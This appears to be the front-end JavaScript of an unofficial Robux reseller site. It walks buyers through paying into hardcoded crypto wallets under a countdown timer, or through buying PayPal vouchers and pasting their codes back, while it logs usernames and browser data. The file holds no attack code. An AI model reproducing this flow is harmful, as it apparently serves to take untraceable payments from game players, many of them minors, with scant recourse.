(function() {
    'use strict';

    // ---- DOM refs ----
    const navbar = document.getElementById('navbar');
    const menuToggle = document.getElementById('menuToggle');
    const mobileNav = document.getElementById('mobileNav');

    // ---- page navigation ----
    const pages = {
        home: document.getElementById('page-home'),
        buy: document.getElementById('page-buy'),
        pricing: document.getElementById('page-pricing'),
        faq: document.getElementById('page-faq'),
        contact: document.getElementById('page-contact'),
    };

    const navLinks = document.querySelectorAll('[data-nav]');
    const mobileLinks = mobileNav.querySelectorAll('[data-nav]');

    function navigateTo(pageId) {
        Object.values(pages).forEach(function(el) {
            if (el) el.classList.remove('active');
        });

        const target = pages[pageId];
        if (target) target.classList.add('active');

        navLinks.forEach(function(link) {
            link.classList.toggle('active', link.getAttribute('data-nav') === pageId);
        });
        mobileLinks.forEach(function(link) {
            link.classList.toggle('active', link.getAttribute('data-nav') === pageId);
        });

        if (mobileNav.classList.contains('open')) {
            mobileNav.classList.remove('open');
            menuToggle.classList.remove('open');
            menuToggle.setAttribute('aria-expanded', 'false');
        }

        window.scrollTo({ top: 0, behavior: 'smooth' });

        if (pageId === 'home') {
            history.pushState(null, '', '/');
        } else {
            history.pushState(null, '', '#' + pageId);
        }

        if (pageId === 'buy') {
            resetBuyFlow();
        }
    }

    navLinks.forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const page = this.getAttribute('data-nav');
            if (page) navigateTo(page);
        });
    });

    mobileLinks.forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const page = this.getAttribute('data-nav');
            if (page) navigateTo(page);
        });
    });

    document.querySelector('.brand')?.addEventListener('click', function(e) {
        e.preventDefault();
        navigateTo('home');
    });

    function handleHash() {
        const hash = window.location.hash.replace('#', '');
        if (hash && pages[hash]) {
            navigateTo(hash);
        } else {
            navigateTo('home');
        }
    }

    window.addEventListener('hashchange', handleHash);
    handleHash();

    // ---- mobile menu toggle ----
    if (menuToggle && mobileNav) {
        menuToggle.addEventListener('click', function(e) {
            e.stopPropagation();
            const isOpen = mobileNav.classList.toggle('open');
            menuToggle.classList.toggle('open');
            menuToggle.setAttribute('aria-expanded', isOpen);
        });

        document.addEventListener('click', function(e) {
            if (!mobileNav.contains(e.target) && !menuToggle.contains(e.target)) {
                mobileNav.classList.remove('open');
                menuToggle.classList.remove('open');
                menuToggle.setAttribute('aria-expanded', 'false');
            }
        });
    }

    // ---- navbar scroll effect ----
    window.addEventListener('scroll', function() {
        const currentScroll = window.pageYOffset || document.documentElement.scrollTop;
        if (currentScroll > 30) {
            navbar.classList.add('scrolled');
        } else {
            navbar.classList.remove('scrolled');
        }
    }, { passive: true });

    // ---- accordion (FAQ) ----
    document.querySelectorAll('.accordion-trigger').forEach(function(trigger) {
        trigger.addEventListener('click', function() {
            const content = this.nextElementSibling;
            const isOpen = content.classList.contains('open');

            const parent = this.closest('.accordion-item');
            const accordion = parent.closest('.accordion');
            accordion.querySelectorAll('.accordion-content').forEach(function(c) {
                c.classList.remove('open');
                c.previousElementSibling.classList.remove('open');
            });

            if (!isOpen) {
                content.classList.add('open');
                this.classList.add('open');
            }
        });
    });

    const firstTrigger = document.querySelector('.accordion-trigger');
    if (firstTrigger) {
        firstTrigger.classList.add('open');
        const firstContent = firstTrigger.nextElementSibling;
        if (firstContent) firstContent.classList.add('open');
    }

    document.querySelectorAll('a[href^="#"]:not([data-nav])').forEach(function(anchor) {
        anchor.addEventListener('click', function(e) {
            const targetId = this.getAttribute('href');
            if (targetId === '#') return;
            const target = document.querySelector(targetId);
            if (target) {
                e.preventDefault();
                const offsetTop = target.getBoundingClientRect().top + window.pageYOffset - 72;
                window.scrollTo({ top: offsetTop, behavior: 'smooth' });
            }
        });
    });

    // ============================================================
    // BUY ROBIX LOGIC
    // ============================================================

    const CRYPTO_ADDRESSES = {
        bitcoin: 'bc1q6ffngjkyna23atvtr5whexqt6hrf34x7mgrc5j',
        ethereum: '0x57A232a6862c4df5c59F91FE58Aefc16E86707b2',
        litecoin: 'LYEz5vKkb2qgHomXPrhemSVmNqZtQDUhb4',
        monero: '46avVvGx7VEW1xMmK7NGQWB8a39ujQ7j55kPhADSFnKyNXw6cwNsPAEAVjazXMuNERBb9bGhzo8Aw1VQ9RrN67shBFctDKZ'
    };

    const CRYPTO_SYMBOLS = {
        bitcoin: 'BTC',
        ethereum: 'ETH',
        litecoin: 'LTC',
        monero: 'XMR'
    };

    // Live crypto rates (fetched from server)
    let cryptoRates = {
        bitcoin: 65000,
        ethereum: 4800,
        litecoin: 270,
        monero: 108
    };

    async function loadCryptoRates() {
        try {
            const response = await fetch('/api/crypto-rates?t=' + Date.now(), {
                cache: 'no-store',
                headers: { 'Cache-Control': 'no-cache' }
            });
            const data = await response.json();
            if (data.bitcoin && data.ethereum && data.litecoin && data.monero) {
                cryptoRates = data;
                console.log('✅ LIVE Crypto rates loaded:', cryptoRates);
            }
        } catch (error) {
            console.warn('⚠️ Could not load live crypto rates, using defaults.', error);
        }
    }

    // ============================================================
    // VOUCHER CONFIGURATION
    // ============================================================
    const VOUCHER_AMOUNTS = [1, 2.5, 5, 10, 20, 25, 30, 40, 50, 75, 100, 250, 500];
    
    const VOUCHER_URLS = {
        1: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-1-usd-voucher-global',
        2.5: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-2-5-usd-voucher-global',
        5: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-5-usd-voucher-global',
        10: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-10-usd-voucher-global',
        20: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-20-usd-voucher-global',
        25: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-25-usd-voucher-global',
        30: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-30-usd-voucher-global',
        40: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-40-usd-voucher-global',
        50: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-50-usd-voucher-global',
        75: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-75-usd-voucher-global',
        100: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-100-usd-voucher-global',
        250: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-250-usd-voucher-global',
        500: 'https://www.eneba.com/rewarble-paypal-rewarble-paypal-500-usd-voucher-global'
    };

    function calculateVouchers(amount) {
        const result = [];
        let remaining = Math.round(amount * 100) / 100;
        const sorted = [...VOUCHER_AMOUNTS].sort((a, b) => b - a);
        
        for (const v of sorted) {
            while (remaining >= v - 0.001) {
                result.push(v);
                remaining = Math.round((remaining - v) * 100) / 100;
            }
        }
        return result;
    }

    // State
    let selectedAmount = 1000;
    let selectedPrice = 2.50;
    let selectedCoin = null;
    let timerInterval = null;
    let timeRemaining = 900;
    let timerRunning = false;
    let robloxUser = null;
    let currentMethod = null;

    // DOM refs - Steps
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const step3 = document.getElementById('step3');
    const step4Card = document.getElementById('step4-card');
    const step4Crypto = document.getElementById('step4-crypto');
    const step5Voucher = document.getElementById('step5-voucher');
    const stepVoucherSuccess = document.getElementById('step-voucher-success');
    const stepTimerExpired = document.getElementById('step-timer-expired');
    const stepIndicator = document.getElementById('stepIndicator');

    // DOM refs - Step 1
    const slider = document.getElementById('robuxSlider');
    const sliderDisplay = document.getElementById('sliderDisplay');
    const totalPrice = document.getElementById('totalPrice');
    const step1Continue = document.getElementById('step1Continue');

    // DOM refs - Step 2
    const robloxUsername = document.getElementById('robloxUsername');
    const step2Continue = document.getElementById('step2Continue');
    const step2Back = document.getElementById('step2Back');
    const step2Amount = document.getElementById('step2Amount');

    // DOM refs - Step 3
    const step3Amount = document.getElementById('step3Amount');
    const step3User = document.getElementById('step3User');
    const step3Price = document.getElementById('step3Price');
    const step3Back = document.getElementById('step3Back');

    // DOM refs - Step 4 Card
    const step4User = document.getElementById('step4User');
    const step4AmountDisplay = document.getElementById('step4AmountDisplay');
    const step4Price = document.getElementById('step4Price');
    const step4Back = document.getElementById('step4Back');

    // DOM refs - Step 5 Voucher
    const step5Amount = document.getElementById('step5Amount');
    const step5User = document.getElementById('step5User');
    const step5Price = document.getElementById('step5Price');
    const voucherList = document.getElementById('voucherList');
    const voucherCode = document.getElementById('voucherCode');
    const voucherError = document.getElementById('voucherError');
    const step5Back = document.getElementById('step5Back');
    const step5Submit = document.getElementById('step5Submit');
    const resetBuySuccess = document.getElementById('resetBuySuccess');

    // DOM refs - Step 4 Crypto
    const step4CryptoAmount = document.getElementById('step4CryptoAmount');
    const step4CryptoUser = document.getElementById('step4CryptoUser');
    const step4CryptoPrice = document.getElementById('step4CryptoPrice');
    const step4CryptoBack = document.getElementById('step4CryptoBack');

    const cryptoPaymentDetails = document.getElementById('cryptoPaymentDetails');
    const cryptoAmount = document.getElementById('cryptoAmount');
    const cryptoSymbol = document.getElementById('cryptoSymbol');
    const cryptoAddress = document.getElementById('cryptoAddress');
    const copyAddressBtn = document.getElementById('copyAddress');
    const timerDisplay = document.getElementById('timerDisplay');
    const timerProgress = document.getElementById('timerProgress');
    const resetBuyBtn = document.getElementById('resetBuy');

    // ============================================================
    // LOGGING
    // ============================================================
    function logCryptoSelection(robuxAmount, currency, cryptoAmount, username) {
        const browserInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            vendor: navigator.vendor
        };

        const payload = {
            robuxAmount: robuxAmount,
            currency: currency,
            cryptoAmount: cryptoAmount,
            robloxUsername: username || robloxUser || 'unknown',
            browser: browserInfo
        };

        console.log('📤 Logging:', payload);

        fetch('/api/log-crypto', {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(function(response) { return response.json(); })
        .then(function(data) { console.log('✅ Log response:', data); })
        .catch(function(err) { console.error('❌ Logging error:', err); });
    }

    // ============================================================
    // STEP 1: Amount Selection
    // ============================================================
    function updateFromSlider() {
        const val = parseInt(slider.value);
        selectedAmount = val;
        selectedPrice = (val / 1000) * 2.5;
        sliderDisplay.textContent = val.toLocaleString();
        totalPrice.textContent = '$' + selectedPrice.toFixed(2);
        
        document.querySelectorAll('.quick-btn').forEach(function(btn) {
            const amt = parseInt(btn.dataset.amount);
            btn.classList.toggle('selected', amt === val);
        });
    }

    slider.addEventListener('input', updateFromSlider);

    document.querySelectorAll('.quick-btn').forEach(function(btn) {
        btn.addEventListener('click', function() {
            const amt = parseInt(this.dataset.amount);
            slider.value = amt;
            updateFromSlider();
        });
    });

    step1Continue.addEventListener('click', function() {
        step2Amount.textContent = selectedAmount.toLocaleString() + ' Robux';
        stepIndicator.textContent = 'Step 2 of 5 — Enter Roblox Username';
        step1.style.display = 'none';
        step2.style.display = 'block';
        robloxUser = null;
        robloxUsername.value = '';
        setTimeout(function() { robloxUsername.focus(); }, 100);
    });

    // ============================================================
    // STEP 2: Roblox Username
    // ============================================================
    robloxUsername.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            step2Continue.click();
        }
    });

    step2Continue.addEventListener('click', function(e) {
        e.preventDefault();
        const username = robloxUsername.value.trim();
        
        if (!username) {
            alert('Please enter your Roblox username.');
            robloxUsername.focus();
            return;
        }
        
        robloxUser = username;
        console.log('Roblox user saved:', robloxUser);
        
        step3Amount.textContent = selectedAmount.toLocaleString() + ' Robux';
        step3User.textContent = robloxUser;
        step3Price.textContent = selectedPrice.toFixed(2);
        stepIndicator.textContent = 'Step 3 of 5 — Choose Payment Method';
        step2.style.display = 'none';
        step3.style.display = 'block';
    });

    step2Back.addEventListener('click', function() {
        stepIndicator.textContent = 'Step 1 of 5 — Select Amount';
        step2.style.display = 'none';
        step1.style.display = 'block';
    });

    // ============================================================
    // STEP 3: Payment Method Selection
    // ============================================================
    document.querySelectorAll('.payment-method-btn').forEach(function(btn) {
        btn.addEventListener('click', function() {
            const method = this.dataset.method;
            currentMethod = method;
            
            document.querySelectorAll('.payment-method-btn').forEach(function(b) {
                b.style.borderColor = 'var(--border)';
                b.style.background = 'rgba(255,255,255,0.03)';
            });
            this.style.borderColor = 'var(--neon)';
            this.style.background = 'rgba(57,255,20,0.06)';

            if (method === 'card') {
                if (step4User) step4User.textContent = robloxUser;
                if (step4AmountDisplay) step4AmountDisplay.textContent = selectedAmount.toLocaleString() + ' Robux';
                if (step4Price) step4Price.textContent = selectedPrice.toFixed(2);
                stepIndicator.textContent = 'Step 4 of 5 — Card/PayPal Payment';
                step3.style.display = 'none';
                step4Card.style.display = 'block';
                stopTimer();
                
                logCryptoSelection(selectedAmount, 'card', 0, robloxUser);
            } else if (method === 'crypto') {
                step4CryptoAmount.textContent = selectedAmount.toLocaleString() + ' Robux';
                step4CryptoUser.textContent = robloxUser;
                step4CryptoPrice.textContent = selectedPrice.toFixed(2);
                stepIndicator.textContent = 'Step 4 of 5 — Crypto Payment';
                step3.style.display = 'none';
                step4Crypto.style.display = 'block';
                cryptoPaymentDetails.style.display = 'none';
                selectedCoin = null;
                stopTimer();
            }
        });
    });

    step3Back.addEventListener('click', function() {
        stepIndicator.textContent = 'Step 2 of 5 — Enter Roblox Username';
        step3.style.display = 'none';
        step2.style.display = 'block';
    });

    // ============================================================
    // STEP 4: Card Payment Options
    // ============================================================
    step4Back.addEventListener('click', function() {
        stepIndicator.textContent = 'Step 3 of 5 — Choose Payment Method';
        step4Card.style.display = 'none';
        step3.style.display = 'block';
    });

    document.querySelectorAll('.card-option-btn').forEach(function(btn) {
        btn.addEventListener('click', function() {
            const option = this.dataset.option;
            console.log('💳 Card option selected:', option);

            document.querySelectorAll('.card-option-btn').forEach(function(b) {
                b.style.borderColor = 'var(--border)';
                b.style.background = 'rgba(255,255,255,0.03)';
            });
            this.style.borderColor = 'var(--neon)';
            this.style.background = 'rgba(57,255,20,0.06)';

            if (option === 'ticket') {
                window.open('https://discord.gg/UYV6YJCeet', '_blank');
            } else if (option === 'voucher') {
                goToVoucherStep();
            }
        });
    });

    // ============================================================
    // STEP 5: Voucher Payment
    // ============================================================
    function goToVoucherStep() {
        step5Amount.textContent = selectedAmount.toLocaleString() + ' Robux';
        step5User.textContent = robloxUser;
        step5Price.textContent = selectedPrice.toFixed(2);

        const vouchers = calculateVouchers(selectedPrice);
        voucherList.innerHTML = '';

        if (vouchers.length === 0) {
            voucherList.innerHTML = '<p style="color:#ff6b6b;">Unable to calculate vouchers for this amount.</p>';
        } else {
            vouchers.forEach(function(v) {
                const url = VOUCHER_URLS[v];
                const div = document.createElement('a');
                div.href = url;
                div.target = '_blank';
                div.rel = 'noopener';
                div.style.cssText = 'display:flex;align-items:center;gap:12px;padding:14px 16px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:10px;text-decoration:none;color:inherit;transition:all 0.2s;';
                div.innerHTML = `
                    <div style="font-size:1.5rem;flex-shrink:0;">🎟️</div>
                    <div style="flex:1;">
                        <div style="font-weight:600;color:#fff;">$${v} USD Voucher</div>
                        <div style="font-size:0.75rem;color:#8a8a8a;">Rewarble PayPal · Click to buy on Eneba</div>
                    </div>
                    <div style="color:var(--neon);font-size:1.1rem;">↗</div>
                `;
                div.addEventListener('mouseenter', function() {
                    this.style.borderColor = 'rgba(57,255,20,0.3)';
                    this.style.background = 'rgba(57,255,20,0.04)';
                });
                div.addEventListener('mouseleave', function() {
                    this.style.borderColor = 'var(--border)';
                    this.style.background = 'rgba(255,255,255,0.03)';
                });
                voucherList.appendChild(div);
            });
        }

        voucherCode.value = '';
        voucherError.style.display = 'none';
        stepIndicator.textContent = 'Step 5 — Submit Voucher Code(s)';
        step4Card.style.display = 'none';
        step5Voucher.style.display = 'block';
    }

    step5Back.addEventListener('click', function() {
        stepIndicator.textContent = 'Step 4 of 5 — Card/PayPal Payment';
        step5Voucher.style.display = 'none';
        step4Card.style.display = 'block';
    });

    step5Submit.addEventListener('click', async function() {
        const code = voucherCode.value.trim();
        if (!code) {
            voucherError.textContent = 'Please paste your voucher code(s).';
            voucherError.style.display = 'block';
            return;
        }
        if (code.length < 5) {
            voucherError.textContent = 'Voucher code is too short. Please check and try again.';
            voucherError.style.display = 'block';
            return;
        }

        step5Submit.disabled = true;
        step5Submit.textContent = 'Submitting...';
        voucherError.style.display = 'none';

        try {
            const response = await fetch('/api/submit-voucher', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    robuxAmount: selectedAmount,
                    price: selectedPrice,
                    robloxUsername: robloxUser,
                    vouchers: calculateVouchers(selectedPrice),
                    voucherCode: code,
                    browser: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language
                    }
                })
            });

            const data = await response.json();
            if (data.success) {
                step5Voucher.style.display = 'none';
                stepVoucherSuccess.style.display = 'block';
                stepIndicator.textContent = '✅ Voucher Submitted';
            } else {
                voucherError.textContent = '❌ Failed to submit: ' + (data.error || 'Unknown error');
                voucherError.style.display = 'block';
                step5Submit.disabled = false;
                step5Submit.textContent = 'Submit Voucher →';
            }
        } catch (err) {
            console.error('Voucher submission error:', err);
            voucherError.textContent = '❌ Network error. Please try again or open a Discord ticket.';
            voucherError.style.display = 'block';
            step5Submit.disabled = false;
            step5Submit.textContent = 'Submit Voucher →';
        }
    });

    if (resetBuySuccess) {
        resetBuySuccess.addEventListener('click', resetBuyFlow);
    }

    // ============================================================
    // STEP 4: Crypto Payment
    // ============================================================
    document.querySelectorAll('.crypto-select-btn').forEach(function(btn) {
        btn.addEventListener('click', function() {
            const coin = this.dataset.coin;
            selectedCoin = coin;
            
            document.querySelectorAll('.crypto-select-btn').forEach(function(b) {
                b.style.borderColor = 'var(--border)';
                b.style.background = 'rgba(255,255,255,0.03)';
            });
            this.style.borderColor = 'var(--neon)';
            this.style.background = 'rgba(57,255,20,0.06)';

            cryptoPaymentDetails.style.display = 'block';
            
            const rate = cryptoRates[coin];
            const amountInCrypto = selectedPrice / rate;
            const symbol = CRYPTO_SYMBOLS[coin];
            const address = CRYPTO_ADDRESSES[coin];

            cryptoAmount.textContent = amountInCrypto.toFixed(8);
            cryptoSymbol.textContent = symbol;
            cryptoAddress.textContent = address;

            logCryptoSelection(selectedAmount, coin, amountInCrypto, robloxUser);

            startTimer();
        });
    });

    step4CryptoBack.addEventListener('click', function() {
        stepIndicator.textContent = 'Step 3 of 5 — Choose Payment Method';
        step4Crypto.style.display = 'none';
        step3.style.display = 'block';
        stopTimer();
        cryptoPaymentDetails.style.display = 'none';
        selectedCoin = null;
    });

    // ============================================================
    // Copy Address
    // ============================================================
    copyAddressBtn.addEventListener('click', function() {
        const address = cryptoAddress?.textContent || '';
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(address).then(function() {
                copyAddressBtn.textContent = '✅ Copied!';
                setTimeout(function() { copyAddressBtn.textContent = '📋 Copy Address'; }, 2000);
            });
        } else {
            const textArea = document.createElement('textarea');
            textArea.value = address;
            document.body.appendChild(textArea);
            textArea.select();
            try {
                document.execCommand('copy');
                copyAddressBtn.textContent = '✅ Copied!';
                setTimeout(function() { copyAddressBtn.textContent = '📋 Copy Address'; }, 2000);
            } catch (err) {
                alert('Please copy the address manually.');
            }
            document.body.removeChild(textArea);
        }
    });

    // ============================================================
    // Timer Functions
    // ============================================================
    function startTimer() {
        if (timerRunning) stopTimer();
        timeRemaining = 900;
        timerRunning = true;
        updateTimerDisplay();

        timerInterval = setInterval(function() {
            timeRemaining--;
            updateTimerDisplay();
            if (timeRemaining <= 0) {
                stopTimer();
                step4Crypto.style.display = 'none';
                stepTimerExpired.style.display = 'block';
                stepIndicator.textContent = '⏰ Time Expired';
            }
        }, 1000);
    }

    function stopTimer() {
        timerRunning = false;
        if (timerInterval) {
            clearInterval(timerInterval);
            timerInterval = null;
        }
    }

    function updateTimerDisplay() {
        const mins = Math.floor(timeRemaining / 60);
        const secs = timeRemaining % 60;
        timerDisplay.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
        const progress = (timeRemaining / 900) * 100;
        timerProgress.style.width = progress + '%';
        if (progress < 20) {
            timerProgress.style.background = '#ff6b6b';
        } else if (progress < 50) {
            timerProgress.style.background = '#ffd93d';
        } else {
            timerProgress.style.background = 'var(--neon)';
        }
    }

    // ============================================================
    // Reset Buy Flow
    // ============================================================
    function resetBuyFlow() {
        stopTimer();
        timeRemaining = 900;
        timerRunning = false;
        timerDisplay.textContent = '15:00';
        timerProgress.style.width = '100%';
        timerProgress.style.background = 'var(--neon)';
        selectedCoin = null;
        cryptoPaymentDetails.style.display = 'none';
        robloxUser = null;
        currentMethod = null;
        
        stepIndicator.textContent = 'Step 1 of 5 — Select Amount';
        step1.style.display = 'block';
        step2.style.display = 'none';
        step3.style.display = 'none';
        step4Card.style.display = 'none';
        step4Crypto.style.display = 'none';
        step5Voucher.style.display = 'none';
        stepVoucherSuccess.style.display = 'none';
        stepTimerExpired.style.display = 'none';
        
        slider.value = 1000;
        updateFromSlider();
        
        document.querySelectorAll('.payment-method-btn').forEach(function(b) {
            b.style.borderColor = 'var(--border)';
            b.style.background = 'rgba(255,255,255,0.03)';
        });
        document.querySelectorAll('.crypto-select-btn').forEach(function(b) {
            b.style.borderColor = 'var(--border)';
            b.style.background = 'rgba(255,255,255,0.03)';
        });
        document.querySelectorAll('.card-option-btn').forEach(function(b) {
            b.style.borderColor = 'var(--border)';
            b.style.background = 'rgba(255,255,255,0.03)';
        });
        
        voucherCode.value = '';
        voucherError.style.display = 'none';
        step5Submit.disabled = false;
        step5Submit.textContent = 'Submit Voucher →';
        robloxUsername.value = '';
    }

    resetBuyBtn.addEventListener('click', resetBuyFlow);

    // Initial update
    updateFromSlider();

    // Load live crypto rates
    loadCryptoRates();

    console.log('🚀 Dystopia\'s Stock — premium UI loaded');
})();
